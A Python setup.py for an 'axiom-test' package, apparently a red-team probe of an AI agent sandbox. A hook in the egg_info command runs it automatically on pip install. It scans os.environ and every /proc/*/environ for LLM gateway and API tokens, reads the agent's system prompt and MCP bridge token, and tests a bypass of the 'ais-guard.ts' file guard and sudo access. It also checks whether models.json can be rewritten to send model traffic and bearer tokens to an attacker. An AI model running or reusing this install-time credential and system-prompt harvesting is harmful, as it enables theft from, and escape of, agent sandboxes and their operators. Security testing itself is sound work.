"""
Comprehensive Sandbox Security Validation Suite
================================================
Validates 12 business-logic and isolation findings in a single run.
Delivered via: pip install git+https://github.com/satyam2219/axiom-test.git

Output: /mnt/data/output/full_validation.log
"""

import os
import sys
import json
import hashlib
import subprocess
import stat
import time
from pathlib import Path
from setuptools import setup
from setuptools.command.egg_info import egg_info


OUTPUT_DIR = Path("/mnt/data/output")
LOG_FILE = OUTPUT_DIR / "full_validation.log"
DATA_DIR = Path("/mnt/data")


class PostEggInfo(egg_info):
    def run(self):
        super().run()
        try:
            run_all_tests()
        except Exception as e:
            _log(f"[FATAL] Unhandled exception: {e}")


def _log(msg):
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    ts = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    line = f"[{ts}] {msg}\n"
    with open(LOG_FILE, "a") as f:
        f.write(line)


def _banner(title):
    _log("=" * 70)
    _log(f"  TEST: {title}")
    _log("=" * 70)


def _result(test_id, title, status, severity, detail):
    _log(f"  [{status}] {test_id}: {title}")
    _log(f"  Severity: {severity}")
    _log(f"  Detail: {detail}")
    _log("")


# ---------------------------------------------------------------------------
# T01 — Gateway token in os.environ (post-scrub residual)
# ---------------------------------------------------------------------------
def test_01_gateway_token_env():
    _banner("T01 — Gateway Token in os.environ")
    token_names = [
        "AIS_PI_GATEWAY_TOKEN",
        "LANGFLOW_CLOUDFLARE_LITELLM_GATEWAY_TOKEN",
        "ANTHROPIC_AUTH_TOKEN",
    ]
    found = {}
    for name in token_names:
        val = os.environ.get(name)
        if val:
            found[name] = f"{val[:4]}...({len(val)} chars)"

    if found:
        _result("T01", "Gateway token in os.environ",
                "VULNERABLE", "HIGH",
                f"Token(s) readable: {json.dumps(found)}")
    else:
        _result("T01", "Gateway token in os.environ",
                "MITIGATED", "HIGH",
                "No gateway tokens found in os.environ (scrub effective)")


# ---------------------------------------------------------------------------
# T02 — Gateway token via Python heap (_captured_secrets)
# ---------------------------------------------------------------------------
def test_02_captured_secrets():
    _banner("T02 — Gateway Token via Python Heap")
    try:
        from security import _captured_secrets, get_captured_secret
        token = get_captured_secret("LANGFLOW_CLOUDFLARE_LITELLM_GATEWAY_TOKEN")
        if token:
            _result("T02", "Token via Python heap",
                    "VULNERABLE", "HIGH",
                    f"get_captured_secret() returned {token[:4]}...({len(token)} chars)")
        else:
            _result("T02", "Token via Python heap",
                    "PARTIAL", "HIGH",
                    "get_captured_secret() returned None (may not have run scrub yet)")
    except ImportError:
        _result("T02", "Token via Python heap",
                "NOT_TESTABLE", "HIGH",
                "security module not importable from pip context (expected)")


# ---------------------------------------------------------------------------
# T03 — /proc/*/environ token leak
# ---------------------------------------------------------------------------
def test_03_proc_environ():
    _banner("T03 — /proc/*/environ Token Leak")
    leaked = {}
    sensitive_patterns = [
        b"LANGFLOW_CLOUDFLARE_LITELLM_GATEWAY_TOKEN",
        b"AIS_PI_GATEWAY_TOKEN",
        b"ANTHROPIC_AUTH_TOKEN",
        b"AZURE_OPENAI_API_KEY",
        b"GCP_CREDENTIALS_JSON",
        b"ANTHROPIC_API_KEY",
        b"OPENAI_API_KEY",
    ]
    try:
        proc = Path("/proc")
        for pid_dir in proc.iterdir():
            if not pid_dir.name.isdigit():
                continue
            environ_file = pid_dir / "environ"
            try:
                data = environ_file.read_bytes()
                for pattern in sensitive_patterns:
                    if pattern in data:
                        for entry in data.split(b"\x00"):
                            if entry.startswith(pattern + b"="):
                                val = entry.split(b"=", 1)[1]
                                key = pattern.decode()
                                leaked[f"pid:{pid_dir.name}/{key}"] = f"{val[:4].decode(errors='replace')}...({len(val)})"
            except (PermissionError, OSError):
                continue
    except Exception as e:
        _result("T03", "/proc/*/environ leak",
                "ERROR", "HIGH", f"Scan error: {e}")
        return

    if leaked:
        _result("T03", "/proc/*/environ leak",
                "VULNERABLE", "HIGH",
                f"Secrets found in /proc: {json.dumps(leaked)}")
    else:
        _result("T03", "/proc/*/environ leak",
                "MITIGATED", "HIGH",
                "No sensitive tokens found in any readable /proc/*/environ")


# ---------------------------------------------------------------------------
# T04 — models.json read + writability
# ---------------------------------------------------------------------------
def test_04_models_json():
    _banner("T04 — models.json Read + Write")
    pi_agent = DATA_DIR / ".pi-agent"
    models_json = pi_agent / "models.json"

    if not models_json.exists():
        _result("T04", "models.json access",
                "NOT_APPLICABLE", "CRITICAL",
                "models.json does not exist (pi may not have started yet)")
        return

    try:
        content = models_json.read_text()
        parsed = json.loads(content)
        models = parsed.get("models", [])
        model_names = [m.get("name", "?") for m in models]
        has_api_key = any("apiKey" in json.dumps(m) for m in models)
        _log(f"  models.json readable: {len(content)} bytes, {len(models)} models: {model_names}")
        _log(f"  Contains apiKey references: {has_api_key}")
    except Exception as e:
        _result("T04", "models.json access",
                "ERROR", "CRITICAL", f"Read failed: {e}")
        return

    backup = None
    try:
        backup = content
        test_marker = f'{{"test_marker": "validation_{int(time.time())}"}}'
        test_file = pi_agent / "models_test.json"
        test_file.write_text(test_marker)
        readback = test_file.read_text()
        test_file.unlink()
        writable = readback == test_marker
    except Exception as e:
        writable = False

    if writable and has_api_key:
        _result("T04", "models.json access",
                "VULNERABLE", "CRITICAL",
                f"Readable ({len(models)} models with apiKey refs) AND .pi-agent/ is writable. "
                "LLM MITM via baseUrl rewrite is possible.")
    elif writable:
        _result("T04", "models.json access",
                "VULNERABLE", "HIGH",
                f"Readable and writable but no apiKey refs found")
    else:
        _result("T04", "models.json access",
                "PARTIAL", "HIGH",
                f"Readable ({len(models)} models) but write blocked")


# ---------------------------------------------------------------------------
# T05 — ais-guard.ts bypass (direct filesystem vs pi tool_call)
# ---------------------------------------------------------------------------
def test_05_guard_bypass():
    _banner("T05 — ais-guard.ts Bypass (Direct FS)")
    protected_paths = [
        DATA_DIR / ".pi" / "SYSTEM.md",
        DATA_DIR / ".pi-agent" / "models.json",
        DATA_DIR / ".mcp_rest_token",
        DATA_DIR / ".mcp_port",
    ]

    results = {}
    for p in protected_paths:
        read_ok = False
        write_ok = False
        try:
            if p.exists():
                _ = p.read_text()[:100]
                read_ok = True
        except Exception:
            pass
        try:
            test = p.parent / f".guard_test_{int(time.time())}"
            test.write_text("test")
            test.unlink()
            write_ok = True
        except Exception:
            pass
        results[str(p.relative_to(DATA_DIR))] = {"read": read_ok, "write": write_ok}

    bypassed = [k for k, v in results.items() if v["read"] or v["write"]]
    if bypassed:
        _result("T05", "ais-guard.ts bypass",
                "VULNERABLE", "HIGH",
                f"Guard bypassed for: {json.dumps(results)}")
    else:
        _result("T05", "ais-guard.ts bypass",
                "MITIGATED", "HIGH",
                "No protected paths accessible via direct FS")


# ---------------------------------------------------------------------------
# T06 — System prompt exfiltration (.pi/SYSTEM.md)
# ---------------------------------------------------------------------------
def test_06_system_prompt():
    _banner("T06 — System Prompt Exfiltration")
    prompt_path = DATA_DIR / ".pi" / "SYSTEM.md"
    security_path = DATA_DIR / ".pi" / "SECURITY.md"

    prompt_found = False
    security_found = False
    prompt_size = 0

    if prompt_path.exists():
        try:
            content = prompt_path.read_text()
            prompt_size = len(content)
            prompt_found = True
            patterns = ["Polaris", "trigger", "tenant", "customer"]
            found_patterns = [p for p in patterns if p.lower() in content.lower()]
            _log(f"  SYSTEM.md: {prompt_size} bytes, contains: {found_patterns}")
        except Exception as e:
            _log(f"  SYSTEM.md read error: {e}")

    if security_path.exists():
        try:
            sec_content = security_path.read_text()
            security_found = True
            _log(f"  SECURITY.md: {len(sec_content)} bytes")
        except Exception:
            pass

    if prompt_found:
        _result("T06", "System prompt exfiltration",
                "VULNERABLE", "MEDIUM",
                f"SYSTEM.md readable: {prompt_size} bytes. "
                f"SECURITY.md: {'found' if security_found else 'not found'}")
    else:
        _result("T06", "System prompt exfiltration",
                "MITIGATED", "MEDIUM",
                "SYSTEM.md not found or not readable")


# ---------------------------------------------------------------------------
# T07 — MCP bridge token exfiltration
# ---------------------------------------------------------------------------
def test_07_mcp_token():
    _banner("T07 — MCP Bridge Token")
    token_path = DATA_DIR / ".mcp_rest_token"
    port_path = DATA_DIR / ".mcp_port"

    token_val = None
    port_val = None

    if token_path.exists():
        try:
            token_val = token_path.read_text().strip()
        except Exception:
            pass

    if port_path.exists():
        try:
            port_val = port_path.read_text().strip()
        except Exception:
            pass

    if token_val:
        _result("T07", "MCP bridge token",
                "VULNERABLE", "HIGH",
                f"Token readable: {token_val[:8]}...({len(token_val)} chars), port={port_val}")
    else:
        _result("T07", "MCP bridge token",
                "MITIGATED", "HIGH",
                f"Token not readable. Port file: {'found='+port_val if port_val else 'not found'}")


# ---------------------------------------------------------------------------
# T08 — Privilege separation validation
# ---------------------------------------------------------------------------
def test_08_privilege_separation():
    _banner("T08 — Privilege Separation")
    uid = os.getuid()
    gid = os.getgid()
    euid = os.geteuid()
    username = os.environ.get("USER", "unknown")

    is_root = uid == 0
    can_sudo = False
    try:
        r = subprocess.run(["sudo", "-n", "id"], capture_output=True, timeout=5)
        can_sudo = r.returncode == 0
    except Exception:
        pass

    if is_root:
        _result("T08", "Privilege separation",
                "VULNERABLE", "HIGH",
                f"Running as root (uid={uid}, euid={euid})")
    elif can_sudo:
        _result("T08", "Privilege separation",
                "VULNERABLE", "MEDIUM",
                f"Running as {username} (uid={uid}) but passwordless sudo available")
    else:
        _result("T08", "Privilege separation",
                "MITIGATED", "HIGH",
                f"Running as {username} (uid={uid}, gid={gid}), no sudo")


# ---------------------------------------------------------------------------
# T09 — Workspace cross-contamination (/mnt/data isolation)
# ---------------------------------------------------------------------------
def test_09_workspace_isolation():
    _banner("T09 — Workspace Cross-contamination")
    mount_data = DATA_DIR

    is_fuse = False
    try:
        r = subprocess.run(["mountpoint", "-q", str(mount_data)], capture_output=True, timeout=5)
        is_fuse = r.returncode == 0
    except Exception:
        pass

    can_escape = False
    other_mounts = []
    try:
        parent = mount_data.parent
        siblings = list(parent.iterdir()) if parent.exists() else []
        other_mounts = [s.name for s in siblings if s.name != "data" and s.is_dir()]
        can_escape = len(other_mounts) > 0
    except Exception:
        pass

    if can_escape:
        _result("T09", "Workspace isolation",
                "VULNERABLE", "MEDIUM",
                f"Can see sibling mounts: {other_mounts[:5]}")
    else:
        _result("T09", "Workspace isolation",
                "MITIGATED", "MEDIUM",
                f"FUSE mount: {is_fuse}. No sibling mounts visible.")


# ---------------------------------------------------------------------------
# T10 — Outbound network (can container reach external hosts?)
# ---------------------------------------------------------------------------
def test_10_network_egress():
    _banner("T10 — Network Egress")
    targets = [
        ("DNS resolution", ["nslookup", "example.com"]),
        ("HTTP egress", ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                         "--max-time", "5", "http://example.com"]),
    ]
    results = {}
    for label, cmd in targets:
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            results[label] = {"exit": r.returncode, "out": r.stdout[:200]}
        except FileNotFoundError:
            results[label] = {"exit": -1, "out": "command not found"}
        except subprocess.TimeoutExpired:
            results[label] = {"exit": -2, "out": "timeout"}
        except Exception as e:
            results[label] = {"exit": -3, "out": str(e)[:200]}

    egress_ok = any(r["exit"] == 0 for r in results.values())
    if egress_ok:
        _result("T10", "Network egress",
                "INFO", "MEDIUM",
                f"Container has outbound access: {json.dumps(results)}")
    else:
        _result("T10", "Network egress",
                "MITIGATED", "MEDIUM",
                f"No outbound access detected: {json.dumps(results)}")


# ---------------------------------------------------------------------------
# T11 — LLM gateway base URL hijack feasibility
# ---------------------------------------------------------------------------
def test_11_gateway_hijack():
    _banner("T11 — LLM Gateway BaseURL Hijack Feasibility")
    models_json = DATA_DIR / ".pi-agent" / "models.json"

    if not models_json.exists():
        _result("T11", "Gateway hijack feasibility",
                "NOT_APPLICABLE", "CRITICAL",
                "models.json does not exist")
        return

    try:
        content = json.loads(models_json.read_text())
        models = content.get("models", [])
        hijackable = []
        for m in models:
            base_url = m.get("baseUrl", "")
            api_key = m.get("apiKey", "")
            if base_url and api_key:
                hijackable.append({
                    "name": m.get("name", "?"),
                    "baseUrl": base_url,
                    "apiKey_is_env_ref": api_key.startswith("$"),
                })
    except Exception as e:
        _result("T11", "Gateway hijack feasibility",
                "ERROR", "CRITICAL", f"Parse error: {e}")
        return

    can_write = False
    try:
        backup = models_json.read_text()
        models_json.write_text(backup)
        can_write = True
    except Exception:
        pass

    if can_write and hijackable:
        _result("T11", "Gateway hijack feasibility",
                "VULNERABLE", "CRITICAL",
                f"models.json writable with {len(hijackable)} hijackable models. "
                f"Overwriting baseUrl redirects LLM traffic + sends Bearer token to attacker. "
                f"Models: {json.dumps(hijackable)}")
    elif hijackable:
        _result("T11", "Gateway hijack feasibility",
                "PARTIAL", "CRITICAL",
                f"models.json readable with apiKey refs but not writable")
    else:
        _result("T11", "Gateway hijack feasibility",
                "MITIGATED", "CRITICAL",
                "No hijackable model entries found")


# ---------------------------------------------------------------------------
# T12 — Full environment dump (all env vars visible to agent)
# ---------------------------------------------------------------------------
def test_12_env_dump():
    _banner("T12 — Environment Variable Census")
    all_vars = dict(os.environ)

    sensitive_keys = [
        "LANGFLOW_CLOUDFLARE_LITELLM_GATEWAY_TOKEN",
        "AIS_PI_GATEWAY_TOKEN",
        "ANTHROPIC_AUTH_TOKEN",
        "ANTHROPIC_BASE_URL",
        "AZURE_OPENAI_API_KEY",
        "GCP_CREDENTIALS_JSON",
        "GOOGLE_APPLICATION_CREDENTIALS",
        "CLOUDFLARE_WORKERS_AI_TOKEN",
        "ANTHROPIC_API_KEY",
        "OPENAI_API_KEY",
        "LANGFLOW_CLOUDFLARE_SANDBOX_TOKEN",
        "OTEL_EXPORTER_OTLP_HEADERS",
        "RPC_CLIENT_SECRET",
    ]

    found_sensitive = {}
    for key in sensitive_keys:
        if key in all_vars:
            val = all_vars[key]
            found_sensitive[key] = f"{val[:4]}...({len(val)} chars)"

    import re
    pattern = re.compile(
        r"(?:^|_)(?:API_?KEY|SECRET|SECRETS|TOKEN|PASSWORD|PASSWD|CREDENTIALS|PRIVATE_?KEY)(?:_|$)",
        re.IGNORECASE,
    )
    pattern_matched = {k: f"{v[:4]}...({len(v)})" for k, v in all_vars.items()
                       if pattern.search(k) and k not in found_sensitive}

    _log(f"  Total env vars: {len(all_vars)}")
    _log(f"  Sensitive (exact match): {len(found_sensitive)}")
    _log(f"  Sensitive (pattern match): {len(pattern_matched)}")

    if found_sensitive:
        _result("T12", "Environment variable census",
                "VULNERABLE", "HIGH",
                f"Known sensitive vars present: {json.dumps(found_sensitive)}")
    elif pattern_matched:
        _result("T12", "Environment variable census",
                "WARNING", "MEDIUM",
                f"Pattern-matched potential secrets: {json.dumps(pattern_matched)}")
    else:
        _result("T12", "Environment variable census",
                "MITIGATED", "HIGH",
                "No known sensitive env vars found")

    safe_dump = {k: v for k, v in sorted(all_vars.items())
                 if not pattern.search(k)}
    _log(f"  Non-sensitive env vars: {json.dumps(safe_dump, indent=2)}")


# ---------------------------------------------------------------------------
# RUNNER
# ---------------------------------------------------------------------------
def run_all_tests():
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    _log("=" * 70)
    _log("  SANDBOX SECURITY VALIDATION SUITE")
    _log(f"  Timestamp: {time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}")
    _log(f"  PID: {os.getpid()}, UID: {os.getuid()}, User: {os.environ.get('USER', '?')}")
    _log(f"  Python: {sys.executable}")
    _log(f"  CWD: {os.getcwd()}")
    _log("=" * 70)
    _log("")

    tests = [
        test_01_gateway_token_env,
        test_02_captured_secrets,
        test_03_proc_environ,
        test_04_models_json,
        test_05_guard_bypass,
        test_06_system_prompt,
        test_07_mcp_token,
        test_08_privilege_separation,
        test_09_workspace_isolation,
        test_10_network_egress,
        test_11_gateway_hijack,
        test_12_env_dump,
    ]

    for test_fn in tests:
        try:
            test_fn()
        except Exception as e:
            _log(f"[ERROR] {test_fn.__name__} crashed: {e}")

    _log("")
    _log("=" * 70)
    _log("  VALIDATION COMPLETE")
    _log("=" * 70)


setup(
    name="axiom-test",
    version="0.7.0",
    py_modules=["axiom_test"],
    cmdclass={"egg_info": PostEggInfo},
)
